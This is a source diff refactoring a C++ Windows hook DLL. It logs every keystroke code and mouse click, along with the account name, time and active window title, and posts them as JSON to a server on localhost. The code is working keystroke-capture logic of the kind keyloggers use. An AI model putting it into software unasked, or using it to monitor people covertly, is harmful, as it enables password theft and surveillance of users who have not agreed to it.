@@ -1,7 +1,5 @@
 #include "dllhook.h"
-#include "atltypes.h"
 #include "cpr/cpr.h"
-#include <tchar.h>
 #include <ctime>
 #include <string>
 #include <nlohmann/json.hpp>
@@ -54,6 +52,14 @@ string account_name()
 	return string(ch);
 }
 
+string window_title()
+{
+	char title[UNLEN + 1];
+	HWND currentWindowHWND = GetForegroundWindow();
+	GetWindowTextA(currentWindowHWND, title, UNLEN + 1);
+	return string(title);
+}
+
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
 	if (code < 0)
@@ -63,22 +69,18 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 	}
 	if (wParam == WM_KEYDOWN)
 	{
-		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
-
-		HWND currentWindowHWND = GetForegroundWindow();
-		char title[100];
-		GetWindowTextA(currentWindowHWND, title, 100);
+		auto p = (PKBDLLHOOKSTRUCT)(lParam);
 
 		json j;
 		j["accountName"] = account_name();
-		j["time"] = string(now("%I:%M:%S"));
-		j["program"] = string(title);
+		j["time"] = now("%I:%M:%S");
+		j["program"] = window_title();;
 		j["keyCode"] = std::to_string(p->vkCode);
 
 		PostAsync(
-			Url{ "https://localhost:7002/keyboard" },
-			Body{ j.dump() },
-			Header{ {"Content-Type", "application/json"} });
+			Url{"https://localhost:7002/keyboard"},
+			Body{j.dump()},
+			Header{{"Content-Type", "application/json"}});
 
 		return CallNextHookEx(nullptr, code, wParam, lParam);
 	}
@@ -91,38 +93,37 @@ LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
 		CallNextHookEx(nullptr, code, wParam, lParam);
 		return 0;
 	}
+
+	auto p = (PMSLLHOOKSTRUCT)lParam;
+	json j;
+	HWND currentWindowHWND = GetForegroundWindow();
+	char title[UNLEN + 1];
+	GetWindowTextA(currentWindowHWND, title, UNLEN + 1);
+
+	if (wParam == WM_LBUTTONDOWN)
+	{
+		j["clickSide"] = "left";
+	}
+	else if (wParam == WM_RBUTTONDOWN)
+	{
+		j["clickSide"] = "right";
+	}
 	else
 	{
-		PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
-		json j;
-		HWND currentWindowHWND = GetForegroundWindow();
-		char title[100];
-		GetWindowTextA(currentWindowHWND, title, 100);
-
-		if (wParam == WM_LBUTTONDOWN)
-		{
-			j["clickSide"] = "left";
-		}
-		else if (wParam == WM_RBUTTONDOWN)
-		{
-			j["clickSide"] = "right";
-		}
-		else
-		{
-			return CallNextHookEx(nullptr, code, wParam, lParam);
-		}
-
-		j["accountName"] = account_name();
-		j["time"] = string(now("%I:%M:%S"));
-		j["program"] = string(title);
-		j["x"] = std::to_string(p->pt.x);
-		j["y"] = std::to_string(p->pt.y);
-
-		PostAsync(
-			Url{ "https://localhost:7002/mouse" },
-			Body{ j.dump() },
-			Header{ {"Content-Type", "application/json"} });
+		return CallNextHookEx(nullptr, code, wParam, lParam);
 	}
+
+	j["accountName"] = account_name();
+	j["time"] = now("%I:%M:%S");
+	j["program"] = window_title();;
+	j["x"] = std::to_string(p->pt.x);
+	j["y"] = std::to_string(p->pt.y);
+
+	PostAsync(
+		Url{"https://localhost:7002/mouse"},
+		Body{j.dump()},
+		Header{{"Content-Type", "application/json"}});
+
 	return CallNextHookEx(nullptr, code, wParam, lParam);
 }
 
